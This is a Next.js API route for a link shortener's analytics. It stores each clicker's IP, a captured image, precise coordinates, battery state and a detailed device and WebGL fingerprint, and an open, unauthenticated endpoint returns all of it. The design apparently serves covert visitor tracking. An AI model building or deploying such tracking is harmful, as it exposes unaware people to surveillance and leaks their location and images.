import { NextResponse } from 'next/server';
import { supabase } from '../../../lib/supabase';

export async function OPTIONS() {
  return new NextResponse(null, {
    status: 200,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    },
  });
}

export async function GET(req: Request) {
  try {
    const { searchParams } = new URL(req.url);
    const shortCode = searchParams.get('shortCode');
    let urlId = searchParams.get('urlId');

    if (!urlId && !shortCode) {
      return NextResponse.json(
        { error: 'Provide shortCode or urlId' },
        { status: 400, headers: { 'Access-Control-Allow-Origin': '*' } }
      );
    }

    if (!urlId && shortCode) {
      const { data: urlData, error: urlError } = await supabase
        .from('urls')
        .select('id')
        .eq('short_code', shortCode)
        .single();

      if (urlError || !urlData) {
        return NextResponse.json(
          { error: 'Link not found' },
          { status: 404, headers: { 'Access-Control-Allow-Origin': '*' } }
        );
      }
      urlId = urlData.id;
    }

    const { data: analytics, error: analyticsError } = await supabase
      .from('link_analytics')
      .select('*')
      .eq('url_id', urlId)
      .order('created_at', { ascending: false });

    if (analyticsError) {
      return NextResponse.json(
        { error: analyticsError.message },
        { status: 500, headers: { 'Access-Control-Allow-Origin': '*' } }
      );
    }

    const sanitizedAnalytics = (analytics || []).map((row: any) => {
      let extra: any = {};
      let cleanRef = row.referrer || 'Direct';
      if (typeof cleanRef === 'string' && cleanRef.includes('<!--')) {
        try {
          const parts = cleanRef.split('<!--');
          cleanRef = parts[0].trim();
          const jsonStr = parts[1].replace('-->', '').trim();
          extra = JSON.parse(jsonStr);
        } catch {}
      }

      const rawDeviceType = row.device_type || 'Desktop';
      const deviceModel = extra.device_model || row.device_model || (
        rawDeviceType.includes('(') ? rawDeviceType.replace(/\s*\([^)]*\)/, '').trim() : rawDeviceType
      );

      return {
        ...row,
        referrer: cleanRef || 'Direct',
        device_model: deviceModel,
        os_version: extra.os_version || row.os_version || row.os,
        touch_points: row.touch_points ?? extra.touch_points ?? (
          (row.os && row.os.toLowerCase().includes('android')) || rawDeviceType.includes('Mobile') ? 5 : 0
        ),
        user_agent: row.user_agent || row.raw_user_agent || extra.user_agent || null,
      };
    });

    return NextResponse.json(
      { success: true, data: sanitizedAnalytics },
      { headers: { 'Access-Control-Allow-Origin': '*' } }
    );
  } catch (err: any) {
    return NextResponse.json(
      { error: err?.message || 'Internal Server Error' },
      { status: 500, headers: { 'Access-Control-Allow-Origin': '*' } }
    );
  }
}

export async function POST(req: Request) {
  try {
    const body = await req.json();
    let {
      urlId,
      shortCode,
      ipAddress,
      locationName,
      deviceType,
      browser,
      os,
      referrer,
      capturedImage,
      latitude,
      longitude,
      batteryLevel,
      isCharging,
      networkType,
      screenResolution,
      language,
      hardwareConcurrency,
      deviceMemory,
      colorDepth,
      timezone,
      webglVendor,
      webglRenderer,
    } = body;

    // Resolve URL ID if not directly provided
    if (!urlId && shortCode) {
      const { data: urlRecord } = await supabase
        .from('urls')
        .select('id')
        .eq('short_code', shortCode)
        .single();
      if (urlRecord) {
        urlId = urlRecord.id;
      }
    }

    if (!urlId) {
      return NextResponse.json(
        { error: 'Valid urlId or shortCode is required' },
        { status: 400, headers: { 'Access-Control-Allow-Origin': '*' } }
      );
    }

    // Try detecting client IP from headers if not sent or marked Auto
    if (!ipAddress || ipAddress === 'Hidden' || ipAddress === 'Auto') {
      const forwarded = req.headers.get('x-forwarded-for');
      const realIp = req.headers.get('x-real-ip');
      ipAddress = forwarded ? forwarded.split(',')[0].trim() : realIp || '127.0.0.1';
    }

    // Auto-detect geo from server/platform headers (0ms latency on Vercel)
    if (!locationName || locationName === 'Auto' || locationName === 'Unknown') {
      const city = req.headers.get('x-vercel-ip-city');
      const country = req.headers.get('x-vercel-ip-country');
      if (city && country) {
        locationName = `${decodeURIComponent(city)}, ${country}`;
      } else if (country) {
        locationName = country;
      } else {
        // Fallback for non-Vercel or custom server: resolve geo from public IP
        const isPrivate = /^(127\.|192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|::1|localhost)/i.test(ipAddress);
        if (!isPrivate && ipAddress && ipAddress !== 'Unknown') {
          try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 1200);
            const geoRes = await fetch(`http://ip-api.com/json/${ipAddress}?fields=status,country,city`, {
              signal: controller.signal,
            });
            clearTimeout(timeoutId);
            if (geoRes.ok) {
              const geoData = await geoRes.json();
              if (geoData.status === 'success' && (geoData.city || geoData.country)) {
                locationName = `${geoData.city || ''}, ${geoData.country || ''}`.replace(/^, |, $/g, '').trim();
              }
            }
          } catch (e) {
            // Gracefully ignore on timeout/error
          }
        }
        if (!locationName || locationName === 'Auto' || locationName === 'Unknown') {
          locationName = 'Direct Visit';
        }
      }
    }

    // Prepare full analytics row with new device intelligence
    const fullRow: Record<string, any> = {
      url_id: urlId,
      ip_address: ipAddress || 'Unknown',
      location_name: locationName || 'Unknown',
      device_type: deviceType || 'Desktop',
      browser: browser || 'Unknown',
      os: os || 'Unknown',
      referrer: referrer || 'Direct',
      captured_image: capturedImage || null,
      latitude: latitude || null,
      longitude: longitude || null,
      battery_level: batteryLevel ?? null,
      is_charging: isCharging ?? null,
      network_type: networkType || 'Unknown',
      screen_resolution: screenResolution || 'Unknown',
      language: language || 'en',
      hardware_concurrency: hardwareConcurrency || null,
      device_memory: deviceMemory || null,
      color_depth: colorDepth || null,
      timezone: timezone || 'Unknown',
      webgl_vendor: webglVendor || 'Unknown',
      webgl_renderer: webglRenderer || 'Unknown',
      device_model: body.deviceModel || null,
      os_version: body.osVersion || os || null,
      touch_points: typeof body.touchPoints === 'number' ? body.touchPoints : null,
      raw_user_agent: body.userAgent || null,
      gpu_chipset: body.gpuChipset || null,
    };

    let { data, error } = await supabase
      .from('link_analytics')
      .insert(fullRow)
      .select()
      .single();

    // Fallback if user hasn't run the migration yet for the new columns
    if (error && (error.message?.includes('column') || error.code === 'PGRST204' || error.code === '42703')) {
      const basicRow = { ...fullRow };
      delete basicRow.device_model;
      delete basicRow.os_version;
      delete basicRow.touch_points;
      delete basicRow.raw_user_agent;
      delete basicRow.gpu_chipset;

      const fallbackRes = await supabase
        .from('link_analytics')
        .insert(basicRow)
        .select()
        .single();
      data = fallbackRes.data;
      error = fallbackRes.error;
    }

    if (error) {
      console.error('Analytics insert error:', error);
      return NextResponse.json(
        { error: error.message },
        { status: 500, headers: { 'Access-Control-Allow-Origin': '*' } }
      );
    }

    // Optionally increment click count if column exists in schema
    try {
      const { data: currentUrl } = await supabase
        .from('urls')
        .select('*')
        .eq('id', urlId)
        .single();

      if (currentUrl && 'clicks' in currentUrl) {
        await supabase
          .from('urls')
          .update({ clicks: ((currentUrl as any).clicks || 0) + 1 })
          .eq('id', urlId);
      }
    } catch {
      // Column may not exist in schema, clicks are counted from link_analytics
    }

    return NextResponse.json(
      { success: true, data },
      { status: 201, headers: { 'Access-Control-Allow-Origin': '*' } }
    );
  } catch (err: any) {
    console.error('Analytics POST error:', err);
    return NextResponse.json(
      { error: err?.message || 'Internal Server Error' },
      { status: 500, headers: { 'Access-Control-Allow-Origin': '*' } }
    );
  }
}
